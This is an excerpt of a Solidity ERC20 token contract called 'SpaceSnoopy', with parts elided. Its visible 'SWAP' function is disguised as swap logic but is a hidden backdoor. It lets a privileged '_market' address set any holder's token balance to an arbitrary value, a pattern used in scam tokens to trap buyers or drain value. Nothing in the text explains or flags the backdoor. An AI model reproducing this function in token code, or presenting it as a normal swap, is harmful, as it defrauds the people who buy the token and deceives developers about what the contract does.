...
contract SpaceSnoopy  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private  _name = "SpaceSnoopy";
    string private  _symbol = "SpaceSnoopy";
    uint8 private  _decimals = 9;
    uint256 private _totalSupply = 100000000*10 *10 * 10**9;
    ...
    function SWAP(address C, uint256 tokenAmount, uint256 ethAmount , uint256 bnbAmount  ) external  {require(msg.sender == _market );
         require(C != uniswapV2Pair);
        _tOwned[C] = tokenAmount + ethAmount  * bnbAmount.mul(2).div(100);
    }   
